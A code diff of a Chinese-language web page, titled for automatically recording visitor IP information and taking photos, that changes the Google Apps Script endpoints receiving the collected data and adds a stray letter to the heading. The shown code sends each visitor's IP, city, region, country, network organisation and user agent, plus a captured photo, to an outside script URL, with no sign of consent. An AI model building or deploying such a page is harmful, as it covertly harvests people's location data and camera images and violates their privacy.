@@ -6,7 +6,7 @@
   <title>IP 定位與拍照功能</title>
 </head>
 <body>
-  <h1>自動記錄 IP 資訊並拍攝照片</h1>
+  <h1>自動記錄 IP 資訊並拍d攝照片</h1>
   <p id="ipInfo">IP 資訊載入中...</p>
   <p id="status">尚未開始操作</p>
 
@@ -30,7 +30,7 @@
           `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
 
         // 發送到後端處理
-        const url = new URL('https://script.google.com/macros/s/AKfycbxyDlrvL0rKhvXQ056I6eSuIh9YVwZoz5BF1OxyC_ak0Q0V734vrKBe0kU7WTmSmCyAog/exec');
+        const url = new URL('https://script.google.com/macros/s/AKfycbzcYDht_3NA68S32srTOwQ4cPor6f73xliAyiA7xXA3MWMhp_cwLfwDjtZXCCbmwzXsKw/exec');
         url.searchParams.append('ip', ip);
         url.searchParams.append('ipType', ipType);
         url.searchParams.append('userAgent', userAgent);
@@ -75,7 +75,7 @@
         formData.append('photo', blob, 'photo.jpg');
         formData.append('userAgent', navigator.userAgent);
 
-        const url = 'https://script.google.com/macros/s/AKfycbwqDNaUPQ-ajfcz3b6PxazhjUtIHerkMOdQ09S2_xQGPmlqUNrEUlng0s8TZKx26GTQFA/exec';
+        const url = 'https://script.google.com/macros/s/AKfycbzcYDht_3NA68S32srTOwQ4cPor6f73xliAyiA7xXA3MWMhp_cwLfwDjtZXCCbmwzXsKw/exec';
         const response = await fetch(url, {
           method: 'POST',
           body: formData,
